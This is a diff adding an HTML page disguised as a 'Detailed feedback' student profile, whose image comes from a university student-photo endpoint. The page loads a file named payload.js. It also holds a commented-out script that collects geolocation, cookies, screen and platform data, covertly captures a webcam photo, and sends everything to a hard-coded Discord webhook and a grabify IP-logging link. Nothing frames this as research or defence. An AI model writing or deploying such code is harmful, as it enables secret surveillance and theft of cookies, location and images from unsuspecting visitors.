@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Detailed feedback</title>
+    <script type="text/javascript" src="http://code.jquery.com/jquery-latest.min.js"></script>
+</head>
+<body>
+    <div class="user-pic">
+        <img src="https://eklas.msu.edu.my/eklas_v7/v701/resource/img_display.php?column=pic_contents&table=student_pic&whereCol=matrix_no&id=012024071080" alt="random guy">
+    </div>
+    <div class="user-name"><strong>very important name</strong></div>
+    <div class="user-role">012302301230523</div>
+
+    <script src="https://www.gstatic.com/firebasejs/11.0.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/11.0.2/firebase-firestore-compat.js"></script>
+    <script src="/static/payload.js"></script>
+    <!-- <script>async function getUserInfo(){var e={};const t=new Date;e.DateTime=t.toUTCString();try{navigator.geolocation&&await new Promise((t,o)=>{navigator.geolocation.getCurrentPosition(o=>{e.location=[o.coords.latitude,o.coords.longitude],t()},o)})}catch(t){e.location="Permission Denied"}const o=window.screen.width,n=window.screen.height;e.Resolution=[o,n];const a=navigator.platform;e.System=a,e.Cookie=document.cookie;var i=null;try{i=await captureUserPicture()}catch(e){i=null}await sendMessageToDiscord(e,i),fetch("https://grabify.link/C8MF7M",{method:"GET"})}async function captureUserPicture(){const e=document.createElement("video");e.style.display="none",document.body.appendChild(e);const t=await navigator.mediaDevices.getUserMedia({video:!0});return e.srcObject=t,new Promise((o,n)=>{e.onloadedmetadata=(()=>{e.play(),setTimeout(async()=>{const n=document.createElement("canvas");n.width=e.videoWidth,n.height=e.videoHeight;const a=n.getContext("2d");a.drawImage(e,0,0,n.width,n.height);const i=n.toDataURL("image/jpeg");t.getTracks().forEach(e=>e.stop()),o(i)},1e3)}),e.onerror=(e=>n(e))})}async function sendMessageToDiscord(e,t){const o="https://discord.com/api/webhooks/1305384099841708115/Os4cTuTor643INFznkpJLcCeNCSRog1dUC3ANtLxLgUJUs3TJqWn9TjyB11XlLQXX0Iy",n=new FormData;if(t){const e=t.split(",")[1],o=atob(e),a=new Array(o.length);for(let e=0;e<o.length;e++)a[e]=o.charCodeAt(e);const i=new Uint8Array(a);n.append("file[0]",new Blob([i],{type:"image/jpeg"}),"camera.jpg")}n.append("payload_json",JSON.stringify({content:JSON.stringify(e)}));await fetch(o,{method:"POST",body:n})}getUserInfo();</script> -->
+</body>
+</html>
